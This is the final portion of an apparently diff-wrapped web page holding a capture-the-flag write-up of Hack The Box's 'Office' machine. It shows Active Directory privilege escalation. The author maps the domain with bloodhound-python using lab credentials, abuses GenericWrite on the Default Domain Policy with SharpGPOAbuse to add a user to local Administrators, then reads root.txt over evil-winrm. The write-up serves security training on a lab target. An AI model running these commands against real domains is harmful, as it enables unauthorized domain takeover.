+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; whoami
+office\hhogan
+</code></pre>
+
+<p>After grabing domain info with bloodhound-python (<code>❯ bloodhound-python -c All --use-ldaps -ns 10.10.11.3 -d office.htb -u tstark -p playboy69</code>), starting neo4j server (<code>❯ sudo neo4j console</code>), uploading the files to bloodhound, in Analysis &gt; Find Shortest Paths to Domain Admins I can see that the group “GPO Managers” has GenericWrite privilege on the “Default Domain Policy”:</p>
+
+<p><img src="/assets/images/Office/gpo-managers-GenericWrite-on-Default-Domain-Policy.png" alt="GPO Managers has GenericWrite in Default Domain Policy" /></p>
+
+<p>Also, user hhogan (which we have pwned) belongs to “GPO Managers”:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Windows\Temp\privesc3&gt; net user hhogan
+&lt;SNIP&gt;
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</code></pre>
+
+<p>So I can use <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> to modify the Default Domain Policy and make the machine do one of various things like add rights to a user, add a user to local admins group or add a immediate computer task. In my case, I will add user hhogan to localadmins. But first, we have to build the SharpGPOAbuse project using a Windows 10 VM and Visual Studio (open the .sln file, and click on Compile &gt; Compile solution). Once builded, execute this command in victim machine:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Windows\Temp\privesc3&gt; .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName "Default Domain Policy" --force
+</code></pre>
+
+<p>And you should belong to group Administrators:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Windows\Temp\privesc3&gt; net user hhogan
+&lt;SNIP&gt;
+Local Group Memberships      *Administrators       *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</code></pre>
+
+<p>So you can now see root.txt in a new winrm session:</p>
+
+<pre><code class="language-powershell">❯ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; cd \Users\Administrator\Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+b1****************************a5
+</code></pre>
+
+
+<div id="share-links">
+  <span id="divider-line">____</span>
+  <br><br>
+  <small>21 June 2024</small>
+  <div>
+    
+    Tags:
+    
+    <a href="/search?q=joomla-information-disclosure" class="tag" style="font-family: 'Cascadia Code';">joomla-information-disclosure</a>
+    
+    <a href="/search?q=CVE-2023-23752" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-23752</a>
+    
+    <a href="/search?q=smb-enumeration" class="tag" style="font-family: 'Cascadia Code';">smb-enumeration</a>
+    
+    <a href="/search?q=pcap-tcp-packet-analysis" class="tag" style="font-family: 'Cascadia Code';">pcap-tcp-packet-analysis</a>
+    
+    <a href="/search?q=wireshark" class="tag" style="font-family: 'Cascadia Code';">wireshark</a>
+    
+    <a href="/search?q=krb-hash" class="tag" style="font-family: 'Cascadia Code';">krb-hash</a>
+    
+    <a href="/search?q=joomla-rce" class="tag" style="font-family: 'Cascadia Code';">joomla-rce</a>
+    
+    <a href="/search?q=runascs" class="tag" style="font-family: 'Cascadia Code';">runascs</a>
+    
+    <a href="/search?q=password-reuse" class="tag" style="font-family: 'Cascadia Code';">password-reuse</a>
+    
+    <a href="/search?q=port-forwading" class="tag" style="font-family: 'Cascadia Code';">port-forwading</a>
+    
+    <a href="/search?q=libreoffice-odt-exploitation" class="tag" style="font-family: 'Cascadia Code';">libreoffice-odt-exploitation</a>
+    
+    <a href="/search?q=CVE-2023-2255" class="tag" style="font-family: 'Cascadia Code';">CVE-2023-2255</a>
+    
+    <a href="/search?q=dpapi-creds" class="tag" style="font-family: 'Cascadia Code';">dpapi-creds</a>
+    
+    <a href="/search?q=mimikatz" class="tag" style="font-family: 'Cascadia Code';">mimikatz</a>
+    
+    <a href="/search?q=bloodhound" class="tag" style="font-family: 'Cascadia Code';">bloodhound</a>
+    
+    <a href="/search?q=modifying-group-policy" class="tag" style="font-family: 'Cascadia Code';">modifying-group-policy</a>
+    
+    
+</div>
+  <br>
+  Share this writeup:&nbsp;
+  <a
+    href="javascript:window.open('https://www.facebook.com/sharer.php?u=http://localhost:4000/writeups/HTB/Office.html','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-facebook-official" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://twitter.com/intent/tweet?url=http://localhost:4000/writeups/HTB/Office.html&text=Writeup+for+HTB Office writeup+from+HTB+held+on+21 June 2024&hashtags=ctf,writeup,Office,HTB,joomla-information-disclosure,CVE-2023-23752,smb-enumeration,pcap-tcp-packet-analysis,wireshark,krb-hash,joomla-rce,runascs,password-reuse,port-forwading,libreoffice-odt-exploitation,CVE-2023-2255,dpapi-creds,mimikatz,bloodhound,modifying-group-policy','Windows','width=600,height=500,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-twitter" aria-hidden="true"></i></a>&nbsp;
+  <a
+    href="javascript:window.open('https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/writeups/HTB/Office.html&text=Writeup+for+HTB Office writeup+from+HTB+held+on+2024-06-21 00:00:00 +0200','Windows','width=650,height=350,toolbar=no,menubar=no,scrollbars=yes,resizable=yes,location=no,directories=no,status=no')"><i
+      class="fa fa-linkedin" aria-hidden="true"></i></a>
+</div>
+    </section>
+  </div>
+
+  <div id="comments" class="container">
+    <section id="disqus_container">
+      
+    </section>
+  </div>
+
+  <footer>
+    <div class="social d-flex flex-column justify-content-center w-100">
+    <a href="/search" class="text-center w-100 mt-3 mb-2">
+      <i class="fa fa-sm fa-search"></i>
+    </a>
+    <div class="social-links-bar d-flex justify-content-center mb-2">
+        
+        
+        <a href="https://github.com/GabrielGonzalez211" target="_blank" rel="noopener">
+            <i class="fab fa-lg fa-github" aria-hidden="true"></i>
+        </a>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    </div>
+    
+    <div class="htb_badge d-flex justify-content-center">
+        
+        <script src="https://www.hackthebox.eu/badge/831031"></script>
+        
+    </div>
+    <div class="thm_badge">
+        
+    </div>
+    
+</div>
+
+  </footer>
+
+  <script src="http://localhost:4000/assets/js/prism.js"></script>
+  <button onclick="topFunction()" class="fa fa-arrow-up" id="top" title="Go to top"></button>
+  <script>
+    topScroll = document.getElementById("top");
+
+    window.onscroll = function () { scrollFunction() };
+
+    function scrollFunction() {
+      if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+        topScroll.style.display = "block";
+      } else {
+        topScroll.style.display = "none";
+      }
+    }
+
+    function topFunction() {
+      document.body.scrollTop = 0;
+      document.documentElement.scrollTop = 0;
+    }
+
+    $(window).on('load', function () {
+
+      $('a[download]').each((i, e) => {
+        $(e).addClass('fa fa-download');
+      });
+
+      setSizes();
+    });
+
+    $(window).resize(setSizes);
+
+    function setSizes() {
+      if ($(window).width() < 960) {
+        $('#bottom-bar').hide();
+        $('footer').show();
+        $('#navbarSupportedContent').css('max-height', 'unset');
+        $('.navbar-collapse').collapse('hide');
+        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
+          $('footer').css("position", "unset");
+        } else {
+          $('footer').css("position", "fixed");
+        }
+      }
+      else {
+        $('#bottom-bar').show();
+        $('footer').hide();
+        $('.navbar-collapse').collapse('hide');
+        $('footer').css("position", "fixed");
+        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
+      }
+    }
+  </script>
+
+</body>
+
+</html>
